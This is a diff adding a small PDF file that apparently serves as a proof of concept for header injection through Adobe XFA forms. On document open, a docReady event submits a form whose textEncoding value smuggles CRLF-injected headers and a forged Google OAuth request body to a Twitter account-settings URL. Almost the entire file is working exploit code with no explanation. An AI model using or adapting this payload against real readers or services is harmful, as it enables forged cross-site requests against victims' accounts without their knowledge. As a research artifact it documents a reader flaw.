@@ -1,0 +1,48 @@
+% a PDF file using an XFA
+% most whitespace can be removed (truncated to 570 bytes or so...)
+% Ange Albertini BSD Licence 2012
+% modified by InsertScript 
+
+%PDF-1. % can be truncated to %PDF-\0
+
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf>
+    <interactive>1</interactive>
+</pdf></present></config>
+
+<template>
+    <subform name="_">
+        <pageSet/>
+        <field id="Hello World!">
+            <event activity="docReady" ref="$host" name="event__click">
+               <submit 
+                     textEncoding="UTF-8&#xD;&#xA;Origin: google.com/aaa\r\naa:aa&#xD;&#xA;&#xD;&#xA;client_id=905089343179-lr5hmid2phmf0j6sf0nno6le2i5th0ob.apps.googleusercontent.com&#x26;scope=https://www.googleapis.com/auth/android_video https://www.googleapis.com/auth/payments.video_purchase https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/accounts.reauth&#x26;redirect_uri=https://play.google.com/movie-device&#x26;"
+                     xdpContent="pdf datasets template"
+                     target="https://twitter.com/settings/add_phone"/>
+            </event>
+</field>
+    </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+
+trailer <<
+    /Root <<
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>
